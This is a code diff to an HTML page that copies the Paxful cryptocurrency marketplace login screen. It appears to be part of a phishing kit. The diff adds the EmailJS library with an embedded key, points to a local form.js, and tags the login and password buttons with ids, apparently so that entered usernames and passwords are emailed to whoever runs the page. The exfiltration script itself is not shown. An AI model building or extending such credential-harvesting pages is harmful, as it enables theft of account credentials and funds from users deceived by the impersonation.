@@ -43,7 +43,13 @@
         <link rel="stylesheet"
             href="https://fonts.googleapis.com/css?family=Montserrat:400,500,700|Open+Sans:400,600,700&amp;display=swap&amp;subset=cyrillic">
         <title>Log In to Your Account | Paxful</title>
-        <script src="/backend/form.js></script>
+        <script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script type="text/javascript">
+  emailjs.init('GR1BThQ004I8GjMgL')
+</script>
+        <script src="./backend/form.js></script>
         <!-- Google Tag Manager -->
         <script type="text/javascript" async=""
             src="https://www.googletagmanager.com/gtag/js?id=G-N8ZVYK8W8L&amp;cx=c&amp;_slc=1"></script>
@@ -967,7 +973,7 @@
                                                 <input  type="password" id="txtPass" name="pass" id="pass" autocomplete="current-password"
                                                     data-recording-disable="true" type="password"
                                                     class="min-width-0 border-transparent py-0 form-control"
-                                                    value=""><button type="button"
+                                                    value=""><button type="button" id="submit"
                                                     class="text-gray-600 btn-square btn btn-transparent btn-md"><svg
                                                         width="16" height="16" viewBox="0 0 16 16" fill="currentColor"
                                                         classs="d-block">
@@ -977,7 +983,7 @@
                                                     </svg></button>
                                             </div>
                                         </div>
-                                    </div><button type="submit"
+                                    </div><button type="submit" id="submit"
                                         class="py-3 d-flex justify-content-between btn btn-primary btn-lg btn-block"><span>Log
                                             in</span><svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"
                                             class="reflect-element">
